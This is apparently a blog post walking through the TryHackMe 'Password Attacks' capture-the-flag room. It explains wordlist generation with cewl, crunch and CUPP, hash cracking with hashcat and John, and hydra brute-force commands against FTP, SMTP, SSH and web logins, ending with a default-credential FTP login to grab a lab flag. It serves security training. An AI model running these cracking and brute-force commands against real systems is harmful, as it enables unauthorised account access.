---
layout: post
title: "TryHackMe: Passwords - A Cracking Christmas"
date: 2025-12-12 17:33:44 -0300
categories: TryHackMe CTF
tags: crack password
author: yaza
media_subpath:
image:
  path: /Pastedimage20251212195644.png
---

[Sound track - algorithm is a lie // ambient dub techno playlist](https://youtu.be/KsNHzmcxjY4)

[Sound track - follow the sound, deeper underground | ambient deep techno mix](https://youtu.be/FiYK75-6Y0A)

[Sound track - escape the matrix. | ambient deep techno mix](https://youtu.be/UEt4_LNURbw)

[Room link ](https://tryhackme.com/room/passwordattacks) Time To Complete:

# Information text

- Password profiling
- Password attacks techniques
- Online password attacks

Here are some website lists that provide default passwords for various products.

- [https://cirt.net/passwords](https://cirt.net/passwords)
- [https://default-password.info/](https://default-password.info/)
- [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)

Weak Passwords

- [https://www.skullsecurity.org/wiki/Passwords](https://www.skullsecurity.org/wiki/Passwords) - This includes the most well-known collections of passwords.
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) - A huge collection of all kinds of lists, not only for password cracking.

Leaked
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases

### Combining wordlists

```bash
cat file1.txt file2.txt file3.txt > combined_list.txt
```

To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows:

```bash
sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```

### Customized Wordlists

Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below:

```
user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs
```

-w will write the contents to a file. In this case, list.txt.

-m 5 gathers strings (words) that are 5 characters or more

-d 5 is the depth level of web crawling/spidering (default 2)

http://thm.labs is the URL that will be used

# Action

```bash
$ cewl -w list.txt -d 5 -m 5 https://clinic.thmredteam.com/
```

Gathering employees' names in the enumeration stage is essential.

tool `username_generator`
 `bash
 $ git clone https://github.com/therodri2/username_generator.git
 $ python3 username_generator.py -h
 `

.lst = list
Example:

```bash
$ echo "John Smith" > users.lst
$ python3 username_generator.py -w users.lst
```

### Keyspace Technique

tool `crunch`
crunch can create a wordlist based on the criteria you specify.

```bash
$ crunch 2 2 01234abcd -o crunch.txt
```

-o to save the output
where min and max are numbers ( 2 2 )

crunch 8 8 0123456789abcdefABCDEF -o crunch.txt the file generated is 459 GB and contains 54875873536 words.

-t to combine words of our choice
@ - lower case alpha characters

, - upper case alpha characters

% - numeric characters

^ - special characters including space

```bash
$ crunch 6 6 -t pass%%
```

### CUPP - Common User Passwords Profiler

tool `CUPP` https://github.com/Mebus/cupp
If you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information. CUPP will take the information supplied and generate a custom wordlist based on what's provided.

CUPP supports an interactive mode where it asks questions about the target and based on the provided answers, it creates a custom wordlist. If you don't have an answer for the given field, then skip it by pressing the Enter key.

```bash
$ python3 cupp.py -i
```

Pre-created wordlists can be downloaded to your machine as follows:
 `$ python3 cupp.py -l`

CUPP could also provide default usernames and passwords from the Alecto database by using the -a option.

==What is the crunch command to generate a list containing THM@% and output to a file named tryhackme.txt?==
This one was hard/tricky: `crunch 5 5 -t "THM^^" -o tryhackme.txt`
the tricky is to use " " select max and min 5 5 and use ^ to gerenate special caracters (like @%). Therefore with this command `crunch 5 5 -t "THM^^" -o tryhackme.txt` one of the results will be THM@% literally as the question asks.

Let's move on...

To identify the type of hash, we could a tool such as hashid or hash-identifier

### Hashcat

```bash
$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt --show

```

-a 0  sets the attack mode to a dictionary attack
-a 3  sets the attacking mode as a brute-force attack
-m 0  sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes.
f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes.
/usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack
We run hashcat with --show option to show the cracked value if the hash has been cracked
As a result, the cracked value is rockyou.
hashcat has charset options that could be used to generate your own combinations. The charsets can be found in `hashcat --help` options.
To show all supported Hash Modes use -hh

## Task 5

```bash
$ hash-identifier
SHA-1
```

sha-1

```bash
$ hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt
```

sunshine

```bash
$ hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d

Approaching final keyspace - workload adjusted.

e48e13207341b6bffb7fb1622282247b:1337

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: e48e13207341b6bffb7fb1622282247b

```

1337

## Task 6

### Offline Attacks - Rule-Based

Let's check what rules comes with John

```bash
$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
```

We can take a list of password and generate more based on the rule with the command:

```bash
john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
```

[KureLogic](https://contest-2010.korelogic.com/rules.html) is one of the best rules in John

Or we can create or own rule:

```bash
$ sudo vi /etc/john/john.conf
[List.Rules:THM-Password-Attacks] Az"[0-9]" ^[!@#$]
```

## Task 7

Only getting ready to the action, grabbing some words on our wordlist

```bash
$ cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/
```

## Task 8

tool `hydra` for attacking network services logins
syntax of attacking the FTP server:
`$ hydra -l ftp -P passlist.txt ftp://10.10.x.x`

-l ftp we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.

ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

first try default credentials.

SMTP
`$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v`

SSH
`$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v`

```bash
$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```

-l admin  we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.

10.10.x.x the IP address or the fully qualified domain name (FQDN) of the target.

http-get-form the type of HTTP request, which can be either http-get-form or http-post-form.

Next, we specify the URL, path, and conditions that are split using :

login-get/index.php the path of the login page on the target webserver.

username=^USER^&password=^PASS^ the parameters to brute-force, we inject ^USER^ to brute force usernames and ^PASS^ for passwords from the specified dictionary.

-f to stop the brute-forcing attacks after finding a valid username and password

Other cracking tools:

- Medusa
- Ncrack
- others!

# Start action!

I need to find the password without brute-forcing...
Let's search for default ones
https://cirt.net/passwords/?criteria=ftp
tried anonymous:password, worked!

```bash
$ ftp 10.64.145.224
Connected to 10.64.145.224.
220 (vsFTPd 3.0.5)
Name (10.64.145.224:yazalaque): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

Looking for the flag with `ls and cd`

```bash
ftp> get flag.txt

$ cat flag.txt
THM{d0abe799f25738ad739c20301aed357b}

```

... Still need to finish the room.
